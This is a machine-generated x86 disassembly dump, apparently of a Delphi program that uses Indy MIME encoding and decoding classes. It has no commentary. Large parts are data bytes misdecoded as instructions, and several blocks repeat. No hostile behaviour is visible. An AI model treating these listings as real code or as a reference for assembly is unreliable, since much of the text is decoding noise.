add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah dh
mov al [ 0xffffffff9ae40047 ]
inc edi
add [ esi ] cl
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
dec ecx
dec ebp
inc ebp
add [ eax ] al
cmp [ eax + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
push edi
pop eax
pop ecx
pop edx
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
dec ecx
dec ebp
inc ebp
nop
and [ eax + 0xe070047 ] 0x54
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
je r-xdata
jb r-xdata
jno r-xdata
dec ecx
dec ebp
inc ebp
cmp [ eax - 0x65abffb9 ] ah
inc edi
add [ ebx ] al
add [ ebx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_4034a0
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
dec ecx
dec ebp
inc ebp
add [ eax ] al
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
clc
dec [ ebx + 0x33f08bda ]
ror [ ebx + 0x6e69e8c6 ] cl
cli
dec [ ebp + 0x158b3046 ]
in al 0x15
dec eax
add al ch
xor ebx [ esi + 0x46c6fff8 ]
xor al 0x3d
jbe r-xdata
dec edx
xchg ebx eax
jne r-xdata
mov esi eax
js r-xdata
ja r-xdata
mov eax esi
jpe r-xdata
xor edx edx
jns r-xdata
dec esp
sahf
dec eax
add [ ecx + 0x1f ] bh
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x3d
mov eax esi
test bl bl
je r-xdata
xor [ edx ] esi
xor esi [ esi + 0x39383736 ]
call sub_420fcc
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_403fa4
mov [ esi + 0x34 ] 0x3d
sub ebp [ edi ]
xor [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47a0ab
inc [ eax ]
add [ eax ] al
inc ecx
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
je r-xdata
jb r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_4034a0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
clc
dec [ ebx + 0x33f08bda ]
ror [ ebx + 0x6e69e8c6 ] cl
cli
dec [ ebp + 0x158b3046 ]
in al 0x15
dec eax
add al ch
xor ebx [ esi + 0x46c6fff8 ]
xor al 0x3d
jbe r-xdata
mov esi eax
xor edx edx
js r-xdata
mov eax esi
call sub_420fcc
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_403fa4
mov [ esi + 0x34 ] 0x3d
jpe r-xdata
dec esp
sahf
dec eax
add [ ecx + 0x1f ] bh
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x3d
mov eax esi
test bl bl
je r-xdata
xor [ edx ] esi
xor esi [ esi + 0x39383736 ]
sub ebp [ edi ]
add [ eax ] al
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47a0f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x3d
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47a148
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_403fa4
mov [ esi + 0x34 ] 0x3d
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47a190
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47a1c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a1c8
retn
mov eax rw-data
call sub_403f50
sub_47a229
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bl
adc [ edx ] al
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
cmovb eax [ eax ]
adc al 0xa4
inc edi
add [ ecx ] bl
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ ebx - 0x1374aa40 ] cl
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_47a33e
jne r-xdata
xor eax eax
pop edx
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
mov dl [ edx ]
call sub_404138
mov eax [ ebp - 0x4 ]
add [ eax ] al
add [ ebx - 0x60e217fa ] cl
clc
inc [ ebp - 0x72ce8140 ]
inc ebp
cld
je r-xdata
mov eax esi
mov ecx 0x1
mov edx 0x1
call sub_4044b0
dec ebx
push [ fs : eax ]
push eax
jb r-xdata
mov eax [ esi ]
call sub_404210
test eax eax
jle r-xdata
outsb
je r-xdata
mov [ fs : eax ] esp
mov ebx 0x2
bound ebp [ ebp - 0x75 ]
ror [ edx + 0x19070047 ] 0x54
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
jne r-xdata
jle r-xdata
add al ch
inc esp
je r-xdata
mov [ 0xffffffffc085fff8 ] al
dec [ ebx + 0x54bafc45 ]
mov [ 0x44e80047 ] eax
push eax
jb r-xdata
outsb
je r-xdata
mov edx r-xdata
cld
bound ebp [ ebp + 0x38 ]
mov [ 0xffffffff984c0047 ] al
inc edi
add [ edx ] al
add [ esi ] dl
dec ecx
inc ebx
outsd
jb r-xdata
call sub_404554
test eax eax
jne r-xdata
pop ecx
pop ecx
je r-xdata
mov [ fs : eax ] edx
push sub_47a345
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
clc
dec [ ebx + 0x75 ]
les esi [ ebx ]
rcr [ edx + 0x59 ] 0x59
push eax
jb r-xdata
outsb
je r-xdata
jne r-xdata
bound ebp [ ebp ]
sub_47a2cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_47a33e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a345
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
mov dl [ edx ]
call sub_404138
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404554
test eax eax
jle r-xdata
mov eax esi
mov ecx 0x1
mov edx 0x1
call sub_4044b0
dec ebx
jne r-xdata
mov eax [ esi ]
call sub_404210
test eax eax
jle r-xdata
sub_47a358
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47a406
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_40459c
mov eax esi
call sub_404210
mov edi eax
jmp r-xdata
test edi edi
jle r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
mov edx 0x1
mov eax esi
call sub_404470
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_40425c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a40d
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f74
retn
mov al [ esi + edi - 0x1 ]
add al 0xf7
sub al 0x2
jb r-xdata
mov bl [ esi + edi - 0x1 ]
mov eax ebx
sub al 0xa
je r-xdata
sub al 0x2
je r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404138
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov ecx 0x1
call sub_4044f8
sub al 0x3
jne r-xdata
sub al 0x13
je r-xdata
dec edi
sub_47a414
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
call sub_404400
mov esi [ rw-data ]
xor eax eax
push ebp
push sub_47a5f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_403f50
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_47a358
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jg r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
call sub_404218
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_404210
test eax eax
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_403f50
mov ebx 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a5fa
lea eax [ ebp - 0x30 ]
mov edx 0xc
call sub_403f74
retn
mov eax [ ebp - 0xc ]
call sub_404210
push eax
lea eax [ ebp - 0xc ]
call j_sub_40441c
mov edx eax
mov eax edi
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
call sub_404210
test eax eax
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404470
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_404218
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4044b0
dec ebx
jne r-xdata
push ebp
call sub_47a2cc
pop ecx
lea eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
call sub_40425c
mov eax [ ebp - 0x24 ]
call sub_4081bc
mov ebx eax
cmp bl 0x20
jne r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
call sub_404138
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_407d30
mov eax [ ebp - 0x18 ]
mov ecx [ esi ]
mov edx r-xdata
call ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_404138
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
call sub_404218
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jle r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
call sub_404138
mov eax [ ebp - 0x28 ]
mov edx r-xdata
call sub_404554
test eax eax
jle r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_404138
push [ ebp - 0x2c ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4042d0
push ebp
call sub_47a2cc
pop ecx
jmp r-xdata
sub_47a63b
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
xor eax eax
push ebp
push sub_47a669
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a670
retn
sub_47a799
cmpsd [ esi ] [ edi ]
inc edi
add [ eax + eax ] al
add [ eax ] al
cmp al 0x91
inc edi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
cmp [ ecx - 0x6b23ffb9 ] ch
inc edi
add [ ecx ] bl
push esp
dec ecx
dec ebp
jae r-xdata
add [ esp + edx ] ch
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ ebx + edx * 4 ] bh
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax - 0x7ffb86a ] cl
clc
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add al bl
mov ah 0x47
add [ 0x4d644954 ] dl
jae r-xdata
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x6fffb909 ] dh
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
outsb
outsw
dec ebp
dec ecx
dec ebp
inc ebp
mov eax eax
xor al 0xa8
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x47a8 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 4 + 0x47 ] dh
add [ eax ] dh
add [ eax ] al
or al 0x92
inc edi
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
jmp r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xa9
dec ecx
dec ebp
inc ebp
mov eax eax
nop
test al 0x47
add [ edi ] al
adc eax 0x4d644954
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a9f5
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f74
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f14
test al al
je r-xdata
outsb
outsw
dec ebp
dec ecx
dec ebp
inc ebp
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_47a9ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x70 ]
call sub_47d0cc
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40425c
add [ ebx + esi * 4 + 0x54190047 ] cl
dec ecx
dec ebp
jae r-xdata
or [ ecx ] dh
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_407f14
test al al
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47aa34
mov ebx eax
inc edi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
dec esp
mov bl 0x47
xchg ebx eax
dec ecx
dec ebp
inc ebp
xor al 0xa8
inc edi
add [ edx + edx * 4 + 0x50047 ] bh
adc cl [ ecx + 0x64 ]
dec ebp
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47aafc
mov ebx eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_407f14
test al al
je r-xdata
jb r-xdata
popad
inc ebx
outsd
jb r-xdata
xor ebx ebx
inc eax
add [ ecx + esi + 0x40 ] al
add [ ebx + esi * 4 + 0x47 ] cl
inc edi
add [ eax ] cl
add [ eax ] al
dec ecx
dec ebp
inc ebp
add [ eax ] al
mov eax eax
adc al 0xa9
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 ] bl
sub_47a825
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x6fffb909 ] dh
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax - 0x7ffb86a ] cl
clc
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add al bl
mov ah 0x47
add [ 0x4d644954 ] dl
jae r-xdata
add [ ebx + edx * 4 ] bh
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
jmp r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xa9
dec ecx
dec ebp
inc ebp
mov eax eax
nop
test al 0x47
add [ edi ] al
adc eax 0x4d644954
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a9f5
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f74
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f14
test al al
je r-xdata
outsb
outsw
dec ebp
dec ecx
dec ebp
inc ebp
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_47a9ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x70 ]
call sub_47d0cc
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40425c
add [ ebx + esi * 4 + 0x54190047 ] cl
dec ecx
dec ebp
jae r-xdata
or [ ecx ] dh
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_407f14
test al al
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47aa34
mov ebx eax
inc edi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
dec esp
mov bl 0x47
xchg ebx eax
dec ecx
dec ebp
inc ebp
xor al 0xa8
inc edi
add [ edx + edx * 4 + 0x50047 ] bh
adc cl [ ecx + 0x64 ]
dec ebp
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47aafc
mov ebx eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_407f14
test al al
je r-xdata
jb r-xdata
popad
inc ebx
outsd
jb r-xdata
xor ebx ebx
inc eax
add [ ecx + esi + 0x40 ] al
add [ ebx + esi * 4 + 0x47 ] cl
inc edi
add [ eax ] cl
add [ eax ] al
dec ecx
dec ebp
inc ebp
add [ eax ] al
mov eax eax
adc al 0xa9
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 ] bl
sub_47aa34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47aac6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
xor edx edx
mov eax esi
call sub_4794fc
mov eax edi
mov edx [ rw-data ]
call sub_4032e0
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47aacd
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi + 0x70 ]
call sub_47d0cc
mov edx [ ebp - 0x4 ]
lea eax [ esi + 0x80 ]
call sub_403fa4
cmp [ edi + 0x44 ] 0x0
je r-xdata
mov [ esi + 0x7c ] 0x0
mov eax [ edi + 0x44 ]
mov edx r-xdata
call sub_40435c
je r-xdata
mov [ esi + 0x7c ] 0x1
jmp r-xdata
sub_47aacd
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47aafc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_404400
xor eax eax
push ebp
push sub_47ab56
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
xor edx edx
mov eax edi
call sub_47aa34
lea eax [ edi + 0x78 ]
mov edx [ ebp + 0x8 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ab5d
lea eax [ ebp + 0x8 ]
call sub_403f50
retn
add esp 0xfffffff0
call sub_4034a0
sub_47ab7c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47ade2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ esi ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_419cc4
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
call sub_403fe8
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_407f14
test al al
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a0f4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_407f14
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_420fcc
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_47adb8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
mov edx [ ebx + 0x78 ]
call sub_403fe8
lea eax [ ebx + 0x78 ]
call sub_403f50
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_47957c
jmp r-xdata
mov ecx [ ebx + 0x80 ]
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_40425c
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_407f14
test al al
je r-xdata
mov [ esi ] 0x1
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
push r-xdata
push [ ebx + 0x80 ]
push r-xdata
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4042d0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_407f14
test al al
je r-xdata
mov ecx [ ebx + 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47aa34
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47adbf
lea eax [ ebp - 0x10 ]
call sub_40d130
retn
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ rw-data ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_404210
test eax eax
jle r-xdata
mov eax [ esi + 0x70 ]
call sub_47d0f8
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_40425c
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404218
mov eax [ ebp - 0x14 ]
call sub_404210
push eax
lea eax [ ebp - 0x14 ]
call j_sub_40441c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_41ad28
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x2e
jne r-xdata
cmp [ ebx + 0x78 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov ecx 0x1
mov edx 0x1
call sub_4044b0
sub_47ae68
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404400
mov eax [ ebp - 0x8 ]
call sub_404400
xor eax eax
push ebp
push sub_47b056
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403fe8
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_403fe8
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_407f14
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x70 ] 0x2
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403fe8
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_407d30
mov edx [ ebp - 0x18 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
mov ebx eax
test ebx ebx
jle r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407d30
mov edx [ ebp - 0x14 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
jle r-xdata
lea eax [ ebp - 0xc ]
call sub_403f50
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0xc ]
call sub_404210
mov ecx eax
lea edx [ ebx + 0x9 ]
mov eax [ ebp - 0xc ]
call sub_404470
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x70 ] 0x1
mov eax [ ebp - 0xc ]
call sub_404210
test eax eax
jle r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_403fe8
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_407d30
mov edx [ ebp - 0x1c ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
